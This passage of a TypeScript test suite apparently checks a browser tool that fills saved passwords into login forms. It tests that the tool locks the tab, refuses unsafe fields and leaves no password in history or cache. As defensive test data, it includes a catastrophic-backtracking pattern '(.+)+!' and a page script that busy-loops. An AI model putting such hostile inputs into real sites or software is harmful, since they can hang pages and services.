        let frozen: number | undefined;

        // The cleanup's lock-down answers exactly when the cleanup's own end comes, and the clock stops there: what is
        // left for the blank page is 0, which Playwright would read as no limit.
        scriptsOff(async (call, send, isOff) => {
            if (call === 1 || !isOff) {
                return send();
            }

            const answer = await send();

            frozen = deadline - 1000;

            return answer;
        });
        fixture.page = loginForm();

        const result = await run(() => frozen ?? Date.now(), undefined, deadline);

        expect(frozen).toBeDefined();
        expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
        expect(page.isClosed()).toBe(true);
    });

    it("types the username into a field outside the form that belongs to it by its form attribute", async () => {
        fixture.page = `<input name="user" form="login"><form id="login" method="post" action="/session"><input name="pw" type="password"><button>Go</button></form>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(sessionPosts().map((hit) => new URLSearchParams(hit.body).get("user"))).toStrictEqual(["ann"]);
    });

    it("reports an error the site answers the sign-in with as sent, not signed in", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            response.statusCode = 503;
            html(response, "<h1>Down for maintenance</h1>");
        };

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("HTTP 503"), submitted: true, success: false });
    });

    it("leaves the tab on a blank page when the lock fails part way, after its script reached the tab's document", async () => {
        const { newCDPSession } = context;

        await page.goto(`${login.origin}/home`);
        context.newCDPSession = async (...args) => {
            const session = await newCDPSession.apply(context, args);
            const { send } = session;

            session.send = (async (method: string, params?: Parameters<typeof send>[1]) =>
                method === "Preload.enable"
                    ? Promise.reject(new Error("Preload is off"))
                    : send.call(session, method as never, params as never)) as typeof send;

            return session;
        };
        fixture.page = loginForm();

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(page.url()).toBe("about:blank");
        await expect(page.evaluate(() => Boolean(new RTCPeerConnection()))).resolves.toBe(true);
        expect(sessionPosts()).toStrictEqual([]);
    });

    /** Has every command `method` of a tab's DevTools session for which `isPicked` says so (told the session's first command) never answer. */
    const stallOn = (method: string, isPicked: (first: string) => boolean): void => {
        const { newCDPSession } = context;

        context.newCDPSession = async (...args) => {
            const session = await newCDPSession.apply(context, args);
            const { send } = session;
            let first: string | undefined;

            session.send = (async (sent: string, params?: Parameters<typeof send>[1]) => {
                first ??= sent;

                return sent === method && isPicked(first) ? NEVER : send.call(session, sent as never, params as never);
            }) as typeof send;

            return session;
        };
    };

    it("types no password when the page's speculation rules cannot be read in time", async () => {
        // The lock's own session of the tab is the one that starts with its target's info.
        stallOn("Page.getFrameTree", (first) => first === "Target.getTargetInfo");
        fixture.page = loginForm();

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("did not answer in time"), submitted: false, success: false });
        expect(await passwordLeft()).toBe(false);
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("closes the session when the guard for the send is not set up in time", async () => {
        // The guard's session is the one that starts by pausing every answer.
        stallOn("Fetch.enable", (first) => first === "Fetch.enable");
        fixture.page = loginForm();

        const result = await run();

        expect(result).toMatchObject({
            error: expect.stringContaining("locked down for the send in time"),
            sessionClosed: true,
            submitted: false,
            success: false,
        });
        expect(page.isClosed()).toBe(true);
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("types nothing when the session that read the served page does not let go of it", async () => {
        const { newCDPSession } = context;

        // The session that reads the served page is the one that turns the HTTP cache off: letting go of it never ends.
        context.newCDPSession = async (...args) => {
            const session = await newCDPSession.apply(context, args);
            const { send } = session;

            session.send = (async (method: string, params?: Parameters<typeof send>[1]) => {
                if (method === "Network.setCacheDisabled") {
                    session.detach = async () => NEVER;
                }

                return send.call(session, method as never, params as never);
            }) as typeof send;

            return session;
        };
        fixture.page = loginForm();

        const result = await run();

        // Its session would keep the tab's cache off and its network watched: the page goes, and the session with it.
        expect(result).toMatchObject({
            error: expect.stringContaining("did not let go of the login page"),
            sessionClosed: true,
            submitted: false,
            success: false,
        });
        expect(page.isClosed()).toBe(true);
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("closes the session when the lock lets go too slowly after a refusal, rather than hand on a tab it may still hold", async () => {
        const { newBrowserCDPSession } = browser;

        // The lock's browser-wide session is the one only the lock opens: letting go of it never ends.
        browser.newBrowserCDPSession = async () => {
            const session = await newBrowserCDPSession.call(browser);

            session.detach = async () => NEVER;

            return session;
        };
        fixture.page = '<input name="pw" type="password">';

        const result = await run().finally(() => {
            browser.newBrowserCDPSession = newBrowserCDPSession;
        });

        expect(result).toMatchObject({ error: expect.stringContaining("not in a form"), sessionClosed: true, submitted: false, success: false });
        expect(page.isClosed()).toBe(true);
    });

    it("stops waiting on a submit handler that does not return", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); const end = Date.now() + 7000; while (Date.now() < end) {} });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("did not finish"), submitted: false, success: false });
    });

    it("signs in through a numeric PIN field, giving its pattern a stand-in of digits", async () => {
        fixture.page = `<form method="post" action="/session"><input name="user"><input name="pw" type="password" pattern="[0-9]*" inputmode="numeric"><button>Go</button></form>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}`, method: "POST", url: "/session" }]);
    });

    it("sends a password longer than the field's maxlength whole, with a stand-in that fits the field and says nothing of its length", async () => {
        const long = "a-saved-password-of-forty-characters-123";

        fixture.page = `<form method="post" action="/session"><input name="user"><input name="pw" type="password" maxlength="12"><button>Go</button></form><script>document.forms[0].addEventListener("submit", () => console.log("stand-in length " + document.forms[0].pw.value.length));</script>`;

        const result = await run(Date.now, `${login.origin}/`, Date.now() + 30_000, long);

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${long}`, method: "POST", url: "/session" }]);
        expect(logged.filter((line) => line.startsWith("stand-in length "))).toStrictEqual(["stand-in length 12"]);
    });

    it("signs in through a field whose pattern fixes a prefix and a length, every time", async () => {
        fixture.page = `<form method="post" action="/session"><input name="user"><input name="pw" type="password" pattern="A[A-Za-z0-9]{63}"><button>Go</button></form>`;

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true });
        expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}`, method: "POST", url: "/session" }]);
    });

    it("refuses a field whose pattern would backtrack, at once, without running it", async () => {
        fixture.page = `<form method="post" action="/session"><input name="user"><input name="pw" type="password" pattern="(.+)+!"><button>Go</button></form>`;

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("only takes a format"), submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("types no password into a field whose pattern no stand-in it can make meets", async () => {
        fixture.page = `<form method="post" action="/session"><input name="user"><input name="pw" type="password" pattern=".*[!@#].*"><button>Go</button></form>`;

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("only takes a format"), submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("says at once that the form's own rules held it back, when a field it requires is left empty", async () => {
        fixture.page = `<form method="post" action="/session"><input name="user"><input name="pw" type="password"><input name="otp" required><button>Go</button></form>`;

        const result = await run();

        // Its own reason, not the one a held-back send gets once it was waited out.
        expect(result).toMatchObject({ error: expect.stringContaining("own rules held it back"), submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("leaves no way back to the sign-in's answer that showed the password: not by the tab's history, nor from the cache", async () => {
        fixture.page = loginForm();
        // Cacheable, as a careless site's answer may be: the sign-in's POST is sent on to a page that shows the password.
        fixture.headers = { "cache-control": "private, max-age=3600" };
        fixture.onSession = (_request, response, body) => {
            fixture.page = `<p>Welcome, ${new URLSearchParams(body).get("pw") ?? ""}</p>`;
            response.writeHead(303, { location: "/welcome" });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/welcome` });
        expect(await page.evaluate(() => document.defaultView?.history.length)).toBe(1);

        // Going back from the only entry goes nowhere: the page stays as it is, with no navigation to wait for.
        await page.evaluate(() => {
            document.defaultView?.history.go(-2);
        });
        await expect(page.waitForEvent("framenavigated", { timeout: 1000 })).rejects.toThrow();

        expect(await page.content()).not.toContain(SAVED_SECRET);

        // The session goes on from a blank tab: a page of the site asks the cache.
        await page.goto(`${login.origin}/home`);

        const cached = await page.evaluate(async () =>
            fetch("/welcome", { cache: "only-if-cached", mode: "same-origin" })
                .then(async (response) => response.text())
                .catch(() => ""),
        );

        expect(cached).not.toContain(SAVED_SECRET);
    });
});
